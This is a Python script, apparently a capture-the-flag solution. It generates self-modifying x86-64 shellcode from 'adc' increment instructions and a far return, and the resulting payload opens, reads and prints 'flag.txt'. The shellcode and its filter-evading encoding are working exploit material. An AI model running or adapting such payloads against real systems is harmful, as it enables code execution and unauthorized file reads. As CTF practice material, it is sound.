import os
os.chdir(os.path.dirname(__file__))

start = b"".join([
    b"\x6a\x33", # push 0x33
    b"\xe8\x00\x00\x00\x00", # call 5
    b"\x48\xbf\x00\x00\x00\x00\x00\x00\x00\x00", # movabs rdi, 0
    b"\x48\xbe\x00\x00\x00\x00\x00\x00\x00\x00", # movabs rsi, 0
    b"\xf9", # stc
    b"\x48\x11\xf7", # adc rdi, rsi
])

MOVE_PTR = b"\x48\x11\xfa" # adc rdx, rdi
INC_VAL = b"\x11\x3a" # adc dword ptr [rdx], edi

out_payload = bytearray(start)
emulated_payload = bytearray(start)
ext = lambda val: [out_payload.extend(val), emulated_payload.extend(val)]

code = [
    b"padding" # skip 7 bc it'll return to rdx+7
    # b"\x48\x89\xec", # mov rsp, rbp (uncomment if rsp is misaligned, but it shouldnt be)
    b"\x6a\x00", # push 0x0
    b"\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74", # movabs rax, 0x78742e67616c662f
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x6a\x02", # push 2
    b"\x58", # pop rax
    b"\x5f", # pop rdi
    b"\x31\xf6", # xor esi, esi
    b"\x31\xd2", # xor edx, edx
    b"\x0f\x05", # syscall
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x5e", # pop rsi
    b"\x5f", # pop rdi
    b"\x31\xc0", # xor eax, eax
    b"\xb2\x7f", # mov dl, 0x7f
    b"\x0f\x05", # syscall
    b"\x89\xc2", # mov edx, eax
    b"\xb0\x01", # mov al, 1
    b"\x89\xc7", # mov edi, eax
    b"\x0f\x05", # syscall
    # b"\xf4", # hlt
]
GOAL = b"".join(code)

def adc(data, idx):
    while True:
        data[idx] = (data[idx] + 1) & 0xff
        if data[idx] != 0:
            break
        idx += 1

for i, c in enumerate(GOAL):
    while emulated_payload[i] != c and i >= 7:
        ext(INC_VAL)
        adc(emulated_payload, i)
    
    if i != len(GOAL) - 1:
        ext(MOVE_PTR)

ext(
    b"\x48\xca\x00\x00" # retfq 0x0
)

print(hex(len(out_payload)))
print(out_payload[:20])
with open("payload4.bin", "wb") as f:
    f.write(out_payload)
